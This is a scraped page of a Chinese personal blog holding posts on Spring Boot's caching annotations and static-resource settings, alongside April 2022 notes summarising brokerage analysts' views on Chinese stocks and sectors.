    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="springboot缓存框架"><a href="#springboot缓存框架" class="headerlink" title="springboot缓存框架"></a>springboot缓存框架</h2><p>springboot的缓存框架对市面上的缓存进行了抽象，使我们可以很方便的集成和使用。它的架构大致如下<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407123350.png" alt="20220407123350"><br>Springboot实现了jsr的标准。</p>
<blockquote>
<p>Java Caching（JSR-107）定义了5个核心接口，分别是CachingProvider, CacheManager, Cache, Entry和 Expiry。<br>CachingProvider：创建、配置、获取、管理和控制多个CacheManager<br>CacheManager：创建、配置、获取、管理和控制多个唯一命名的Cache，Cache存在于CacheManager的上下文中。一个CacheManager仅对应一个CachingProvider<br>Cache：是由CacheManager管理的，CacheManager管理Cache的生命周期，Cache存在于CacheManager的上下文中，是一个类似map的数据结构，并临时存储以key为索引的值。一个Cache仅被一个CacheManager所拥有<br>Entry：是一个存储在Cache中的key-value对<br>Expiry：每一个存储在Cache中的条目都有一个定义的有效期。一旦超过这个时间，条目就自动过期，过期后，条目将不可以访问、更新和删除操作。缓存有效期可以通过ExpiryPolicy设置</p>
</blockquote>
<p><strong>这样做的好处是做到了统一管理缓存，是的框架的接口和实现分离。如果要切换缓存实现，成本也很低。</strong></p>
<h2 id="重要的接口以及注解"><a href="#重要的接口以及注解" class="headerlink" title="重要的接口以及注解"></a>重要的接口以及注解</h2><h3 id="重要接口"><a href="#重要接口" class="headerlink" title="重要接口"></a>重要接口</h3><ul>
<li>Cache：缓存抽象的规范接口，缓存实现有：RedisCache、EhCacheCache、ConcurrentMapCache等</li>
<li>CacheManager：缓存管理器，管理Cache的生命周期</li>
</ul>
<h3 id="重要注解"><a href="#重要注解" class="headerlink" title="重要注解"></a>重要注解</h3><ul>
<li>@Cacheable<br>添加在方法上,根据条件添加缓存</li>
</ul>
<p>value:  缓存的名称,不能为空<br>cacheNames:  缓存的名称,和value二选一<br>key:  缓存的key,默认为空,表示使用方法的参数类型及参数值作为key,支持SpEL<br>keyGenerator:  指定key的生成策略(和key不能共存)<br>cacheManager:  指定缓存管理器<br>cacheResolver:  指定获取解析器<br>condition:  条件符合则缓存<br>unless:  条件符合则不缓存<br>sync:  是否使用异步模式 默认false</p>
<ul>
<li><p>@CachePut<br>添加在方法上,根据条件添加缓存<br>@CachePut作用和@Cacheable类似,区别是 <em><strong>@Cacheable没有缓存数据会执行方法后,把结果缓存起来,第二次调用方法不执行方法,直接从缓存中获取数据并返回.@CachePut每次都会执行方法,不管缓存中有没有数据,都会把结果缓存.</strong></em> </p>
</li>
<li><p>@CacheEvict<br>添加在方法上,根据条件清空缓存.<br>value:  缓存名称,不能为空<br>cacheNames: 缓存的名称,与value二选一<br>keyGenerator:  key的生成器。key&#x2F;keyGenerator二选一使用<br>condition:  触发条件,支持SpEL<br>allEntries:  true表示清除value中的全部缓存,默认为false<br>beforeInvocation:  是否在方法执行前就清空 默认false<br>cacheManager:  指定缓存管理器<br>cacheResolver:  或者指定获取解析器</p>
</li>
<li><p>@CacheConfig<br>作用在类上,为本类的缓存注解配置全局属性<br>cacheNames:  缓存名称<br>keyGenerator:  key的生成器<br>cacheManager:  缓存管理器<br>cacheResolver:  获取解析器</p>
</li>
<li><p>@EnableCaching： 开启缓存</p>
</li>
</ul>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li>Spring boot默认使用的是SimpleCacheConfiguration，即使用ConcurrentMapCacheManager来实现缓存，ConcurrentMapCache实质是一个ConcurrentHashMap集合对象java内置，所以无需引入其他依赖，也没有额外的配置</li>
<li>Caffeine是使用Java8对Guava缓存的重写版本，在Spring Boot 2.0中将取代，基于LRU算法实现，支持多种缓存过期策略</li>
<li>StringRedisTemplate默认采用的是String的序列化策略，保存的key和value都是采用此策略序列化保存的。（JdkSerializationRedisSerializer）RedisTemplate默认采用的是JDK的序列化策略，保存的key和value都是采用此策略序列化保存的。（StringRedisSerializer)</li>
<li>如果使用redis可以配置如下依赖<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- redis starter --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- lettuce pool 缓存连接池 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>不再需要引入其他依赖,SpringBoot导入spring-boot-starter-data-redis时, CacheManager默认使用RedisCache.</p>
</blockquote>
<p>否则可以配置如下依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>在不指定缓存 key 属性的情况下，默认使用 SimpleKeyGenerator 生成 key。除此之外，我们也可以自定义实现 KeyGenerator 接口，生成自己的 key 名称策略。</li>
</ol>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/springboot/" rel="tag">springboot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%93%E5%AD%98/" rel="tag">缓存</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-股票-20220407"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/"
    >股票-20220407</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/07/%E8%82%A1%E7%A5%A8-20220407/" class="article-date">
  <time datetime="2022-04-07T01:25:21.000Z" itemprop="datePublished">2022-04-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="房地产（中南建设等）"><a href="#房地产（中南建设等）" class="headerlink" title="房地产（中南建设等）"></a>房地产（中南建设等）</h3><p>①国联证券郭荆璞估计，单考虑地产投资增速下滑8-10%以及相应的一二手房成交的低迷，就可能使得中国2022年GDP增速下滑到4%出头的水平，若要实现5.5的GDP增长目标，地产政策或将持续调整；<br>②房地产股当前PB处在过去10年9.28%的低估值分位水平，在政策边际改善，叠加稳增长和低估值双重催化，行业或有望迎来戴维斯双击，在此轮房地产周期中，政策目标核心是“维护房地产市场的健康发展，维护住房消费者的合法权益”，因此稳健型房企有望胜出；<br>③郭荆璞从量化角度挑选出中南建设，根据市场一致性预期，目前公司市盈率和市净率分别为4.43&#x2F;0.49倍，在行业中处于低估水平，公司以房地产开发和建筑为主业，土储集中于长三角城市圈及二三线城市，此外公司拥有上海数据交易中心6%的股权，有望受益于数字经济加速发展；<br>④风险提示：宽松政策不及预期等。</p>
<p>阳光医疗<br>阳普医疗：公司是新冠抗原自测上游辅料的生产商。</p>
<p>舒泰神，新冠特效药<br>有投资者向舒泰神提问， 尊敬的董秘！贵公司一开始就采用多路线研发COVID-19新冠肺炎的特效药，BDB-001注射液外，STSA-1005和STSA-1002目前研发进度如何？三者正在推进中？还是已经研发失败？请如实回答！谢谢！ 公司回答表示，您好！BDB-001、STSA-1002、STSA-1005项目均在推进中，有关项目进展，敬请关注后续项目进展公告及定期报告。感谢您对公司的关注，谢谢</p>
<p>永太科技（新能源，钠离子电池，新冠药）<br>近期，北京中科海钠科技有限责任公司发生工商变更，新增华为旗下深圳哈勃科技投资合伙企业（有限合伙）等为股东。中科海钠官网资料显示，中科海钠是一家专注于新一代储能体系-钠离子电池研发与生产的高新技术型企业。企业拥有多项钠离子电池核心专利，是国际少有拥有钠离子电池核心专利与技术的电池企业之一。A股钠离子电池概念股主要有永太科技、翔丰华等。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-股票-20220406"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/"
    >股票-20220406</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/06/%E8%82%A1%E7%A5%A8-20220406/" class="article-date">
  <time datetime="2022-04-06T00:51:11.000Z" itemprop="datePublished">2022-04-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="中药"><a href="#中药" class="headerlink" title="中药"></a>中药</h3><p>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现<br>2022-03-31 18:02 星期四<br>中药（康缘药业、昆药集团、浙江震元）：<br>①国务院办公厅近日印发《“十四五”中医药发展规划》，提出推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等，这是首次以国办名义印发的医药细分子行业的五年规划；<br>②中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，截至2022年3月25日，目前中药板块平均PE为33倍，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现；<br>③中药医保支付新政策重大利好，纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间，对整个中药行业带来比较显著的影响；<br>④陈竹重点看好业绩增长的持续性与估值相匹配、中药创新药增量逻辑、中医服务提供商等核心细分领域；<br>⑤风险提示：政策落地不及预期、中成药集采降价超预期、OTC和配方颗粒竞争超预期等。<br>主题一<br>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现国务院办公厅近日印发《“十四五”中医药发展规划》，提出到2025年，中医药健康服务能力明显增强，中医药高质量发展政策和体系进一步完善，并推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等。值得注意的是，这是首次以国办名义印发的医药细分子行业的五年规划。中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，短期可关注结构性机会，中长期关注受益于政策推动、创新研发以及消费升级的标的企业。截至2022年3月25日，目前中药板块平均PE为33倍，仅高于器械和商业流通板块，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现，2022年将是中医药板块投资的关键一年。<br>陈竹梳理出三条主线：<br>①业绩增长的持续性与估值相匹配：华润三九、红日药业、羚锐制药、太极集团、昆药集团；<br>②中药创新药增量逻辑：以岭药业、康缘药业；<br>③中医服务提供商：新中医诊疗龙头，OMO模式全国布局持续推进的 浙江震元。<br>近期中药行情波动的底层逻辑<br>（1）中药创新研发迅速崛起，注册审批加快：2017年-2021年，国家药监局共计20个新药获批上市，其中2021年共计12个新药获批上市，是近5年来获批中药新药最多的一年；<br>（2）政策利好：国家中医药管理局和国家医保局联合发布了《关于医保支持中医药传承创新发展的指导意见》，首次从支付端出台了中药扶持政策，对整个中药行业带来比较显著的影响；<br>（3）集采政策的温和预期和医保免疫的大健康消费属性：根据湖北省联盟集采结果看中成药降价幅度低于化学药，政策预期温和可控。</p>
<p>中药绝大部分为OTC药物，具有消费品和保健品属性，属于医保免疫区。行业中期受益于政策带来的格局优化<br>（1）中药医保支付新政策重大利好。纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间。<br>（2）2022年是中成药集采元年，湖北省联合19省联盟组织的中成药集采显示，本次集采有157家企业的182个产品参与报价，其中97家企业、111个产品中选，中选率达62%，拟中选价格平均降幅42.27%。相较前几轮的化药集采、医保谈判，湖北中成药集采降价幅度较为温和。<br>（3）中药配方颗粒市场空间打开和竞争格局优化有利于龙头企业。目前我国中药饮片市场规模在2000亿左右，中药配方颗粒占饮片市场份额约20%，预计中药配方颗粒市场规模可达500亿元，远期市场规模可达1000亿元。陈竹认为，未来中药发展必然是以品牌+大健康为主的发展战略，一部分有保密配方高护城河的中药瑰宝类药物，高端的定价和部分特殊的中药材种类，使得部分产品具有奢侈品属性，成为保值、增值的奢侈品，重点企业包括片仔癀、同仁堂。 </p>
<h3 id="数字人民币"><a href="#数字人民币" class="headerlink" title="数字人民币"></a>数字人民币</h3><p>占“半壁江山”！建行数字人民币累计交易额达435亿元，这家公司与其共同研发数字人民币智慧设备<br>2022-03-31 14:02 星期四</p>
<p>建行年报数据显示，截至2021年末，建行数字人民币累计交易笔数8475万余笔，累计交易金额435亿元。这一数字约占全国数字人民币总交易额近五成。</p>
<p>央行数据显示，截至2021年12月31日，全国数字人民币试点场景已超过808.51万个，累计开立个人钱包2.61亿个，交易金额875.65亿元。 行业动态</p>
<p>数字人民币先后经历两轮试点，当前发展进入快车道从试点城市来看，2019年末央行在深圳、苏州、雄安、成都及2022北京冬奥会场景开展数字人民币第一批试点测试。2020年11月开始，增加上海、海南、长沙、西安、青岛、大连6个新的试点地区。第三批试点区域即将落地。</p>
<p>目前，两轮共10个试点城市和1个试点场景已经运行接近2年，应用场景也已经涵盖了生活缴费、餐饮服务、交通出行、购物消费、政务服务等领域。</p>
<pre><code>券商观点
</code></pre>
<p>安信证券夏瀛韬研报认为，考虑到第19届亚运会将于2022年9月在浙江杭州举办（宁波、温州、金华、绍兴、湖州协办），杭州亚运会有望成为继北京冬奥会后，数字人民币又一对外展示的重要窗口。</p>
<p>华安证券尹沿技认为，数字人民币的推广将为相关生态产业带来长期、可持续的投资机遇。看好商业银行侧投资机遇，银行软件系统需要对接央行发行库，柜台机、ATM机等金融机具需要开通相关功能以支持数字人民币的兑换、流通和回笼。</p>
<pre><code>产业链相关公司

广电运通 携手建行打造的数字人民币智慧柜员机正式试点上线，数字人民币智慧柜员机广泛应用于2022年北京冬奥会机场、海关等多个场景，为科技冬奥打造便捷支付环境。

创识科技 关于数字人民币方面，公司目前已经与农行、建行、中行、邮储银行和交通银行等展开合作。
</code></pre>
<h3 id="三农-化肥"><a href="#三农-化肥" class="headerlink" title="三农-化肥"></a>三农-化肥</h3><p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性<br>2022-04-01 13:32<br>农化大周期下，全球粮价高企且化肥库存低位，行业高景气有望至少持续1-2年，目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，分析师看好行业利润更加偏向上游的同时，竞争格局也将得到持续优化。<br>磷化工（川金诺、湖北宜化、云天化）精要：</p>
<p>①当前粮价高企+磷肥库存低位，西部证券杨晖看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续；</p>
<p>②中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显；</p>
<p>③杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化；</p>
<p>④风险因素：安全事故影响开工、环保政策变化、技术路线快速迭代更新等。</p>
<p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性</p>
<p>事件：《求是》杂志发表中共中央总书记、国家主席、中央军委主席习近平的重要文章《坚持把解决好“三农”问题作为全党工作重中之重，举全党全社会之力推动乡村振兴》。</p>
<p>农化大周期之下，本栏目于3月28日《强资源属性+海外套利窗口打开+全球刚需，通胀主线不能忽视这个品种，A股这些公司具备核心保供能力》一文中引用分析师观点，认为当前全球通胀要买上游资源，衰退要买必选消费，化肥兼具两者逻辑，攻守兼备。</p>
<p>今日，西部证券杨晖专题覆盖磷化工行业，认为当前粮价高企+磷肥库存低位，看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续。</p>
<p>中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显。</p>
<p>杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，重点公司包括：云天化、湖北宜化、兴发集团、新洋丰、云图控股、川发龙蟒、川恒股份、中毅达、川金诺、金诚信等。</p>
<p>粮价高企+库存低位，农化大周期下化肥高景气有望持续</p>
<p>当前粮价维持高位将驱动化肥行业需求提升，据Mosaic预测2022年我国磷肥需求增长幅度将在3.5%至6.4%之间。</p>
<p>受粮价高位、原材料价格支撑和下游需求拉动，当前化肥价格坚挺，且有望在春耕旺季来临之际迎来价格再度上行。</p>
<p>短期来看，全球及国内磷肥库存处于低位，此波农化大周期下化肥的高景气有望至少持续1-2年。</p>
<p>中长期来看，此前的出口禁令带来的国际磷肥价格与国内价格形成3500元&#x2F;吨以上的较大价差，市场预期国家可能在春耕之后放开化肥的出口限制。</p>
<p>磷化工企业切入新能源提升业绩弹性，磷酸铁2022年供应缺口犹存</p>
<p>当前国内磷酸铁总产能为64.5万吨，磷酸铁锂总产能为77.6万吨，磷酸铁处于供不应求状态。</p>
<p>从扩产计划看，磷化工企业为未来磷酸铁扩产的主力，占到总扩产计划的55%，且从扩产节奏看，预计2022年全年磷酸铁仍将处于供需错配的状态。</p>
<p>从实际进度看，磷酸铁的扩产将受到环评、能评、工艺等各项限制，同时下游产品验证周期可能导致产能释放低于预期，杨晖看好供需错配格局下磷酸铁景气的延续。</p>
<p>中长期磷化工资源属性凸显，供给侧改革持续优化行业竞争格局</p>
<p>当前国内磷矿石资源面临短缺压力，同时随着碳中和、能耗双控、产能指标等各种供给端控制措施的联合限制，一些资源禀赋布局领先的企业将展现出更强的竞争力。</p>
<p>杨晖认为行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化。</p>
<p>目前磷化工的头部企业基本已完成上游资源的整合，产业链一体化完善，具备充足的资源、成本、能耗指标等优势。</p>
<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="翠微股份（消费，购物，数字货币，芯片）"><a href="#翠微股份（消费，购物，数字货币，芯片）" class="headerlink" title="翠微股份（消费，购物，数字货币，芯片）"></a>翠微股份（消费，购物，数字货币，芯片）</h3><p>子公司海科融通从事第三方支付业务，拥有全国范围的从业资质。已经与多家银行在数字人民币线下收单领域达成合作。具备数字人民币跨行收单能力。目前旗下所有商场均可使用 数字人民币 购物。公司参股了北京核芯达科技有限公司，专注于面向L4级自动驾驶处理器和车载智能语音芯片的研发。为国内车企关键芯片领域提供一流解决方案。首款智能语音芯片已经与 2021 年上半年流片并与全球第二大天窗厂商 英纳法在车顶多音区领域 展开独家合作。</p>
<h3 id="莱茵生物（工业大麻）"><a href="#莱茵生物（工业大麻）" class="headerlink" title="莱茵生物（工业大麻）"></a>莱茵生物（工业大麻）</h3><p>4月1日，美国众议院以220票对204票第二次通过联邦医用大麻合法化法案（MORE Act）；同时参议院联邦合法化法案《大麻管理与机会法案》（CAOA）预计将于4月提交，联邦层面医用大麻合法化加速推进。随着美国工业大麻法规政策持续向好，市场有望快速扩容，利好产业链相关布局企业，尤其是具备规模化生产能力的代工厂以及品牌企业或将迎来快速发展机遇。莱茵生物于2019年正式布局工业大麻，截至2021Q3已累计投资8000万美元在美建立全球最大工业大麻提取工厂，被印第安纳州政府列为示范项目，预计该项目将于2022年6月30日前达成正式量产，年处理原料5000吨，项目毛利率可达50%，同时已与一家全球工业大麻主流企业签订《受托加工意向协议》，后续预计还有更多订单意向。从技术角度来看，莱茵生物目前走得偏趋势而非连板，以5日线为趋势，每一次回落都得到了支撑，那么周五莱茵生物的断板可能会带来低吸机会。</p>
<h3 id="盛航股份（航运）"><a href="#盛航股份（航运）" class="headerlink" title="盛航股份（航运）"></a>盛航股份（航运）</h3><p>目前次新股出现了一个空窗期，上交所在4月20日之前没有新股上市，另外每当巨无霸上市，次新都有提前造势的案例，比如三峡能源对应顺控发展，中国电信对应华菱线缆，中国移动对应三羊马，那么中海油上市前次新大概率也会有妖股的出现。目前连板的盛航股份就是妖股的潜在备选标的之一，从基本面来说，目前公司在行业紧平衡的情况下，上市后通过购买船舶提升市场份额，22年30艘，25年50艘，意味着公司市场份额有望得到快速提升，中期市场份额可接近20%。再加上疫情影响，运力紧张，而各大型炼化项目在“十四五”期间将会迎来密集投产期，极大推动相关石化产品的水上运输需求，公司市场份额的提升有望进一步加快。再从投机的角度思考，该股本身还叠加高送转，填权之后股价也比较低。</p>
<h3 id="招商积余-（地产，物业）"><a href="#招商积余-（地产，物业）" class="headerlink" title="招商积余 （地产，物业）"></a>招商积余 （地产，物业）</h3><p>背靠央企的地产服务龙头，控股股东土储充足支撑中期扩张，有望受益此轮行业格局重构<br>2022-03-31 13:39<br>公司是招商局集团旗下的央企物管旗舰，控股股东招商蛇口实力雄厚，多维度支持业务发展，去年年度新签合同额30.5亿元，新增管理面积9013万平米，分析师看好公司大物业+大资管双轮驱动，有望受益行业格局重构。<br>招商积余（001914）精要：</p>
<p>①公司为招商局集团旗下物业资产管理与服务平台，2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平；</p>
<p>②地方国资和央企优势在于融资能力和成本拥有银行支持，平安证券杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同；</p>
<p>③公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期；</p>
<p>④杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍；</p>
<p>⑤风险因素：控股股东交付节奏不及预期风险、外拓进程不及预期风险。</p>
<p>近期多地出台楼市新政稳定市场预期，当下市场，相对二线企业，地方国资和央企优势在于融资能力和成本拥有银行支持，地方政府保交付任务也会助力国资企业带来更大优势。</p>
<p>今日，平安证券杨侃深度覆盖招商积余，公司为招商局集团旗下物业资产管理与服务平台，2019年重组上市，属A股物管稀缺标的。</p>
<p>公司控股股东招商蛇口实力雄厚，资源禀赋优势突出，利于在增值服务等业务层面形成协同，全业态市场化能力显著。</p>
<p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期。</p>
<p>杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍。</p>
<p>招商积余是央企物管领先者，大物业+大资管双轮驱动</p>
<p>招商积余为招商局集团旗下物业资产管理与服务平台，目前发展物业管理、资产管理两项核心业务。</p>
<p>公司2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平。</p>
<p>物业管理以“沃土云林”商业模式为依托，持续向好发展，2021年收入贡献93.6%，毛利润贡献77.7%。</p>
<p>商业运营2021年末在管商业项目（含筹备）44个，初具规模，2021年收入贡献5.3%，毛利润贡献21.4%。</p>
<p>招商积余控股股东资源禀赋优势突出，全业态市场化能力显著</p>
<p>杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，包括积极销售保障短期交付，土储充足支撑中期扩张，持有物业“双百”战略推动资管业务持续突破。</p>
<p>长远来看，招商蛇口有望受益房地产格局优化，为公司规模发展带来更大想象空间。实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同。</p>
<p>此外，公司具备较强市场化发展能力、全业态综合服务能力，行业竞争加剧下有助于强化综合实力、保障份额获取。</p>
<p>2021年第三方管理面积占比67.7%，住宅、非住宅管理面积占比41%、59%；第三方管理面积1.9亿平米，处行业领先水平。</p>
<p>招商积余轻重分离积极推进，提质增效成果可期</p>
<p>公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，实现重组上市以来收并购首次突破。</p>
<p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重资产分离迈出实质性步伐。</p>
<p>目前，公司已落地100余项改善举措，杨侃看好伴随业务及管理能力提升，预计公司盈利能力、业务获取能力亦有望随之提振[图片]</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-springboot加载静态资源的坑"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/"
    >springboot加载静态资源的坑</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/" class="article-date">
  <time datetime="2022-04-04T01:37:44.000Z" itemprop="datePublished">2022-04-04</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>我们知道springboot中，已经预定义了一些配置，这些配置，指定了静态资源的位置和url访问方式。即使不作任何设置，放在resources下面的public static 等文件夹的静态资源也可以被访问到。也可以在application.yml&#x2F;application.properties文件内更改配置。具体有两个配置项目。</p>
<ul>
<li>spring.mvc.static-path-pattern：根据官网的描述和实际效果，可以理解为静态文件URL匹配头，也就是静态文件的URL地址开头。Springboot默认为：&#x2F;**。</li>
<li>spring.web.resources.static-locations：根据官网的描述和实际效果，可以理解为实际静态文件地址，也就是静态文件URL后，匹配的实际静态文件。Springboot默认为：classpath:&#x2F;META-INF&#x2F;resources&#x2F;,classpath:&#x2F;resources&#x2F;,classpath:&#x2F;static&#x2F;,classpath:&#x2F;public&#x2F;</li>
</ul>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>我做的时候，给用成了spring.resources.static-locations，结果始终不生效！！！原来这个是老版本的配置。记录一下，高版本springboot用这个配置 <em><strong>spring.web.resources.static-locations</strong></em></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpringBoot/" rel="tag">SpringBoot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" rel="tag">问题解决</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-thikphp-5-x-隐藏管理入口"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
